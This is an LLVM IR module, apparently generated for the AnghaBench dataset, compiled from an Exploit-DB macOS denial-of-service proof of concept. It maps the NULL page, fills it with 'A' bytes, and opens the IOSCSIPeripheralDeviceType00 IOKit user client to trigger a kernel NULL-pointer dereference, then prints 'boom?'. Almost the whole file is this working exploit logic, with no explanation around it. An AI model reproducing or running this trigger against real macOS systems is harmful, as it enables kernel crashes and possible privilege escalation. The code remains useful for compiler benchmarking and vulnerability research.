; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39376.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39376.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [4 x i8] c"%x\0A\00", align 1
@KERN_INVALID_ADDRESS = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [17 x i8] c"invalid address\0A\00", align 1
@KERN_NO_SPACE = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [10 x i8] c"no space\0A\00", align 1
@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [29 x i8] c"IOSCSIPeripheralDeviceType00\00", align 1
@MACH_PORT_NULL = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [20 x i8] c"can't find service\0A\00", align 1
@conn = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [26 x i8] c"can't connect to service\0A\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"boom?\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  store i32 0, i32* %3, align 4
  %8 = call i32 (...) @mach_task_self()
  %9 = call i64 @vm_deallocate(i32 %8, i32 0, i32 4096)
  store i64 %9, i64* %2, align 8
  %10 = load i64, i64* %2, align 8
  %11 = load i64, i64* @KERN_SUCCESS, align 8
  %12 = icmp ne i64 %10, %11
  br i1 %12, label %13, label %16

13:                                               ; preds = %0
  %14 = load i64, i64* %2, align 8
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i64 %14)
  br label %16

16:                                               ; preds = %13, %0
  store i32 0, i32* %4, align 4
  %17 = call i32 (...) @mach_task_self()
  %18 = call i64 @vm_allocate(i32 %17, i32* %4, i32 4096, i32 0)
  store i64 %18, i64* %2, align 8
  %19 = load i64, i64* %2, align 8
  %20 = load i64, i64* @KERN_SUCCESS, align 8
  %21 = icmp ne i64 %19, %20
  br i1 %21, label %22, label %37

22:                                               ; preds = %16
  %23 = load i64, i64* %2, align 8
  %24 = load i64, i64* @KERN_INVALID_ADDRESS, align 8
  %25 = icmp eq i64 %23, %24
  br i1 %25, label %26, label %28

26:                                               ; preds = %22
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  br label %28

28:                                               ; preds = %26, %22
  %29 = load i64, i64* %2, align 8
  %30 = load i64, i64* @KERN_NO_SPACE, align 8
  %31 = icmp eq i64 %29, %30
  br i1 %31, label %32, label %34

32:                                               ; preds = %28
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  br label %34

34:                                               ; preds = %32, %28
  %35 = load i64, i64* %2, align 8
  %36 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i64 %35)
  br label %37

37:                                               ; preds = %34, %16
  store i8* null, i8** %5, align 8
  store i32 0, i32* %6, align 4
  br label %38

38:                                               ; preds = %46, %37
  %39 = load i32, i32* %6, align 4
  %40 = icmp slt i32 %39, 4096
  br i1 %40, label %41, label %49

41:                                               ; preds = %38
  %42 = load i8*, i8** %5, align 8
  %43 = load i32, i32* %6, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  store i8 65, i8* %45, align 1
  br label %46

46:                                               ; preds = %41
  %47 = load i32, i32* %6, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %6, align 4
  br label %38

49:                                               ; preds = %38
  %50 = load i32, i32* @kIOMasterPortDefault, align 4
  %51 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0))
  %52 = call i64 @IOServiceGetMatchingService(i32 %50, i32 %51)
  store i64 %52, i64* %7, align 8
  %53 = load i64, i64* %7, align 8
  %54 = load i64, i64* @MACH_PORT_NULL, align 8
  %55 = icmp eq i64 %53, %54
  br i1 %55, label %56, label %58

56:                                               ; preds = %49
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %69

58:                                               ; preds = %49
  %59 = load i64, i64* %7, align 8
  %60 = call i32 (...) @mach_task_self()
  %61 = call i32 @IOServiceOpen(i64 %59, i32 %60, i32 12, i64* @conn)
  %62 = load i64, i64* @conn, align 8
  %63 = load i64, i64* @MACH_PORT_NULL, align 8
  %64 = icmp eq i64 %62, %63
  br i1 %64, label %65, label %67

65:                                               ; preds = %58
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %69

67:                                               ; preds = %58
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %69

69:                                               ; preds = %67, %65, %56
  %70 = load i32, i32* %1, align 4
  ret i32 %70
}

declare dso_local i64 @vm_deallocate(i32, i32, i32) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @vm_allocate(i32, i32*, i32, i32) #1

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @IOServiceOpen(i64, i32, i32, i64*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
